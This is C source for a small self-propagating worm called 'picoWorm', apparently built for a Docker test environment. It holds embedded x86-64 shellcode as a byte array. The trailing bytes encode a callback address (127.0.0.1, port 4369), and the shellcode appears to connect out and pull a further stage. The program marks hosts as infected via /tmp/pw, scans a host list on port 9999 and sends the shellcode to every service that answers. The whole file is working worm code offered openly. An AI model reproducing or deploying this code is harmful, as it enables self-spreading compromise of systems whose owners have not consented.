/* picoWorm
   by pico
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <errno.h>


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "docker/host.h"  // *** THIS IS GENERATED WHEN STARTING TEST ENV

unsigned char stage1_bin[] = {
  0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0xba, 0x06,
  0x00, 0x00, 0x00, 0xe8, 0x79, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc4, 0x48,
  0x8d, 0x3d, 0xac, 0x00, 0x00, 0x00, 0xe8, 0x8a, 0x00, 0x00, 0x00, 0x49,
  0x89, 0xc5, 0x44, 0x89, 0xe7, 0x48, 0x8d, 0x35, 0x92, 0x00, 0x00, 0x00,
  0x83, 0xc2, 0x0a, 0xe8, 0x5b, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x34, 0x24,
  0x4c, 0x89, 0xe7, 0xba, 0x00, 0x04, 0x00, 0x00, 0xe8, 0x3a, 0x00, 0x00,
  0x00, 0x66, 0x85, 0xc0, 0x7e, 0x12, 0x4c, 0x89, 0xef, 0x48, 0x89, 0xc2,
  0xe8, 0x2e, 0x00, 0x00, 0x00, 0x66, 0x85, 0xc0, 0x7e, 0x02, 0xeb, 0xdc,
  0x4c, 0x89, 0xe7, 0xe8, 0x31, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xef, 0x48,
  0x8d, 0x35, 0x59, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xd2,
  0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0xe8, 0x22, 0x00, 0x00, 0x00, 0x31,
  0xc0, 0xeb, 0x38, 0x31, 0xc0, 0xff, 0xc0, 0xeb, 0x32, 0x31, 0xc0, 0x04,
  0x29, 0xeb, 0x2c, 0x31, 0xc0, 0x04, 0x2a, 0xeb, 0x26, 0x31, 0xc0, 0x04,
  0x03, 0xeb, 0x20, 0x31, 0xc0, 0x04, 0x57, 0xeb, 0x1a, 0x31, 0xc0, 0x66,
  0x05, 0x42, 0x01, 0xeb, 0x12, 0x31, 0xc0, 0x66, 0x05, 0x3f, 0x01, 0xeb,
  0x0a, 0x31, 0xc0, 0x04, 0x39, 0xeb, 0x04, 0x31, 0xc0, 0x04, 0x3c, 0x0f,
  0x05, 0xc3,
  0x02, 0x00, 0x11, 0x11,  // FAMILY  AND PORT
  0x7f, 0x00, 0x00, 0x01,  // IP
  0x61, 0x00,
  0x00, 0x10, 0x27, 0xe8, 0x03, 0x64, 0x00, 0x0a, 0x00, 0x01, 0x00
};
unsigned int stage1_bin_len = 215;

int payload () {
  int fd;
  if ((fd = open ("/tmp/pw", O_CREAT | O_EXCL, S_IRWXU)) < 0) {
    if (errno == EEXIST) {
      printf ("+ Already infected node... We are done here!\n");
      close (fd);
      exit (EXIT_SUCCESS);
    } else {
      printf ("- ERROR: Cannot create tmp file...\n");
      exit (EXIT_FAILURE);
    }
  }
  printf ("+ Infecting node...\n");
  return 0;
}

int move (int s) {
  printf ("Sending Stage1 (%d bytes)\n", stage1_bin_len);
  if ((write (s, stage1_bin, stage1_bin_len)) < 0) {
    perror ("write:");
    // silent continue 
  }
}


int scan () {
  int                s;
  struct sockaddr_in ip;
  char               **ptr;
  
  /* Do Scan */
  ip.sin_family = AF_INET;
  ip.sin_port = htons(9999);
  ptr = hosts;
  while (*ptr) {
    ip.sin_addr.s_addr = inet_addr(*((const char**)ptr));
    printf ("Connecting to %s\n", *ptr);
    ptr++;
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect (s, (struct sockaddr*)&ip, 16) < 0) continue;
    printf ("** Service found at : %s\n", inet_ntoa(ip.sin_addr));
    move (s);
    close (s);    

  }
  return 0;
}



int main () {
  payload ();
  scan ();
 
}
